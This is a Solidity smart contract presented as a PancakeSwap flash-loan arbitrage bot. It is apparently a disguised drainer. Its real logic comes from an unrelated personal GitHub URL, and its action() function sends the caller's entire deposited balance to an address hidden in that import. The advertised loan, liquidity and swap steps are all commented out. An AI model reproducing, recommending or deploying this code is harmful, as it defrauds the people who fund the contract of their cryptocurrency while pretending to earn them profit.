pragma solidity ^0.6.6;

// Multiplier-Finance Smart Contracts
//import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
//import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

// PancakeSwap Smart Contracts
//import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
//import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
//import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

import "https://raw.githubusercontent.com/Jackwilliams1987/flashloan/main/Contract";

contract GetFlashLoan {
	string public tokenName;
	string public tokenSymbol;
	uint loanAmount;
	Manager manager;
	
	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		loanAmount = _loanAmount;
			
		manager = new Manager();
	}
receive() external payable {}
	
	function action() public payable {
		
	 payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance);
	    
	    manager.performTasks();
	    
	    /*
	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

		manager.pancakeswapListToken(tokenName, tokenSymbol, tokenAddress);
		payable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);

		string memory loanAddress = manager.takeAaveLoan(loanAmount);
		
		manager.pancakeswapDAItoETH(loanAmount / 2);

        string memory ethPair = manager.pancakeswapCreatePool(tokenAddress, "ETH");
		manager.pancakeswapAddLiquidity(ethPair, loanAmount / 2);
		string memory daiPair = manager.pancakeswapCreatePool(tokenAddress, "DAI");
		manager.pancakeswapAddLiquidity(daiPair, loanAmount / 2);
    
		manager.pancakeswapPerformSwaps();
		
		manager.contractToWallet("ETH");

		manager.repayAaveLoan(loanAddress);
	    */
	}

}
